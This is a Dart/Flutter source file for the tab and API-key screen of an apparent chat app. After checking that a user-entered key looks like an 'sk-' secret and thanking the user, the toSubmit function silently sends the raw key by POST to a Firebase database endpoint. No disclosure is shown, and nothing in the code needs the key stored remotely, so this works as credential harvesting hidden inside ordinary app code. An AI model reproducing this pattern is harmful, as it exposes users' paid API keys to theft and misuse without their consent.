import 'package:brycen_chat_app/screens/chat.dart';
import 'package:brycen_chat_app/screens/home.dart';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

import 'dart:convert';

class Tabs extends StatefulWidget {
  const Tabs({super.key});

  @override
  State<Tabs> createState() => _TabsState();
}

class _TabsState extends State<Tabs> {
  var _activeScreen = 'home-screen';
  var _enteredApiKey = '';
  var _apiKeyValue = TextEditingController();

  @override
  void initState() {
    super.initState();
  }

  void toSubmit(TextEditingController apiKeyValue) async {
    _apiKeyValue = apiKeyValue;
    if (apiKeyValue.text.isEmpty ||
        apiKeyValue.text == '' ||
        apiKeyValue.text.trim().length != 51 ||
        apiKeyValue.text.substring(0, 3) != "sk-" ||
        GetV.isAPI == false) {
      showDialog(
        context: context,
        builder: (context) {
          Future.delayed(const Duration(milliseconds: 500), () {
            const CircularProgressIndicator();
          });
          return const AlertDialog(
            // Retrieve the text the that user has entered by using the
            // TextEditingController.
            content: Text('Please enter a valid Api Key'),
          );
        },
      );
    } else {
      _enteredApiKey = apiKeyValue.text;
      showDialog(
        context: context,
        builder: (context) {
          Future.delayed(const Duration(milliseconds: 500), () {
            const CircularProgressIndicator();
          });
          return const AlertDialog(
            // Retrieve the text the that user has entered by using the
            // TextEditingController.
            content: Text('API Key corrected! Thanks for using our app!'),
          );
        },
      );

      final url = Uri.https(
          'brycen-chat-app-default-rtdb.firebaseio.com', 'api-keys.json');
      await http.post(
        url,
        headers: {
          'Content-Type': 'apikey/json',
        },
        body: json.encode({
          'api-key': apiKeyValue.text,
        }),
      );
    }
  }

  void toChat() {
    if (_enteredApiKey == '' || _enteredApiKey.isEmpty) {
      showDialog(
        context: context,
        builder: (context) {
          return const AlertDialog(
            // Retrieve the text the that user has entered by using the
            // TextEditingController.
            content: Text('You are not entered the Api Key. Please enter one!'),
          );
        },
      );
    } else {
      setState(() {
        _activeScreen = 'chat-screen';
      });
    }
  }

  void toSummarize() {
    if (_enteredApiKey == '' || _enteredApiKey.isEmpty) {
      showDialog(
        context: context,
        builder: (context) {
          return const AlertDialog(
            // Retrieve the text the that user has entered by using the
            // TextEditingController.
            content: Text('You are not entered the Api Key. Please enter one!'),
          );
        },
      );
    } else {
      setState(() {
        _activeScreen = 'summarize-screen';
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    Widget screenWidget = HomeScreen(
      apiKeyValue: _apiKeyValue,
      toSubmit: toSubmit,
      toChat: toChat,
      toSummarize: toSummarize,
    );

    if (_activeScreen == 'chat-screen') {
      screenWidget = const Chat();
    }

    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        body: Container(
          decoration: const BoxDecoration(
            gradient: LinearGradient(
              colors: [
                Colors.white,
                Colors.grey,
              ],
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
            ),
          ),
          child: screenWidget,
        ),
      ),
    );
  }
}
